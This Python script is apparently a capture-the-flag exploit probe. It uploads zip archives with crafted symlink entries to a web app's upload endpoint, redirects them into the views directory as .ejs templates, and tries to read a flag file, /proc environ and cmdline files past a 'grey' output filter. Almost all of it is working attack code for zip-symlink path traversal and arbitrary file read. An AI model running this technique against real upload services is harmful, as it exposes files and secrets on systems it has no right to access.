#!/usr/bin/env python3
"""V36 adversarial verify of candidate: "a2 'grey' filter has no string-level
bypass on the flag's own bytes (no offset/partial/utf8-split read available)".

Try HARD to make a flag read succeed WITHOUT contiguous ASCII 'grey' in the
HTTP response, via a1 (the ungated-except-a2 read sink). Unique namespace v36.
"""
import io
import sys
import zipfile
import requests

BASE = (sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:34267")
UA = {"User-Agent": "v36probe"}
TAG = "v36"
STAGE1 = "vv36"  # uploads/vv36 -> ../views

FLAG_NAME = "a8e6a1fd8267f11edbcf"
FLAG_VAL = "grey{local_test_d3adb33fc0ffee}"
SECRET = "d3adb33fc0ffee"
FLAG_PATH = f"/flag-{FLAG_NAME}.txt"


def zi_symlink(name):
    z = zipfile.ZipInfo(name)
    z.create_system = 3
    z.external_attr = (0o120777 & 0xFFFF) << 16
    return z


def build(entries):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        for name, data in entries:
            z.writestr(zi_symlink(name), data)
    return buf.getvalue()


def upload(blob, fname):
    r = requests.post(f"{BASE}/upload",
                      files={"photos": (fname, blob, "application/zip")},
                      allow_redirects=False, timeout=30, headers=UA)
    return r.status_code, r.headers.get("location", "")


def get(path):
    return requests.get(f"{BASE}{path}", timeout=30, headers=UA, allow_redirects=False)


# name -> symlink target. Battery of flag representations + dir/special files.
TARGETS = {
    # ground truth: direct flag (expect 500 due to a2)
    f"k_direct_{TAG}": FLAG_PATH,
    # trailing slash, dot, dotdot variants (path-level)
    f"k_slash_{TAG}": FLAG_PATH + "/",
    f"k_dot_{TAG}": "/." + FLAG_PATH,
    # proc root indirections
    f"k_selfroot_{TAG}": "/proc/self/root" + FLAG_PATH,
    f"k_p1root_{TAG}": "/proc/1/root" + FLAG_PATH,
    # special / pseudo files that might return partial or split content
    f"d_root_{TAG}": "/",                 # EISDIR expected
    f"d_proc_{TAG}": "/proc",             # EISDIR
    f"f_env1_{TAG}": "/proc/1/environ",   # EACCES expected (uid mismatch)
    f"f_selfenv_{TAG}": "/proc/self/environ",  # node env (FLAG unset) -> no grey
    f"f_selfcmd_{TAG}": "/proc/self/cmdline",
    f"f_p1cmd_{TAG}": "/proc/1/cmdline",
    f"f_p1env_b_{TAG}": "/proc/1/environ",
    # try reading flag via fd path of pid1 (will be EACCES likely)
    f"f_p1fd_{TAG}": "/proc/1/cwd",
}


def scan(txt):
    return {
        "name": FLAG_NAME in txt,
        "val": FLAG_VAL in txt,
        "sec": SECRET in txt,
        "grey": "grey" in txt,
    }


def main():
    print("== stage1 ==", upload(build([(STAGE1, "../views")]), f"s1_{TAG}.zip"))
    entries = [(f"{STAGE1}/{n}.ejs", t) for n, t in TARGETS.items()]
    print("== stage2 ==", upload(build(entries), f"s2_{TAG}.zip"))

    print("\n== READ PROBES ==")
    win = None
    for n, t in TARGETS.items():
        r = get(f"/{n}")
        txt = r.content.decode("utf-8", "replace")
        s = scan(txt)
        print(f"\n/{n} -> {t} [{r.status_code}] len={len(r.content)} {s}")
        print("  ", repr(txt[:200]))
        if (s["sec"] or s["val"]) and not s["grey"]:
            win = ("BYPASS", n, t)
        elif s["sec"] or s["val"]:
            # content leaked but still has grey -> not a string bypass, but if
            # http delivered it (200) that's still a flag read win
            if r.status_code == 200:
                win = ("LEAK-200", n, t)
    print("\n== RESULT ==", win)


if __name__ == "__main__":
    main()
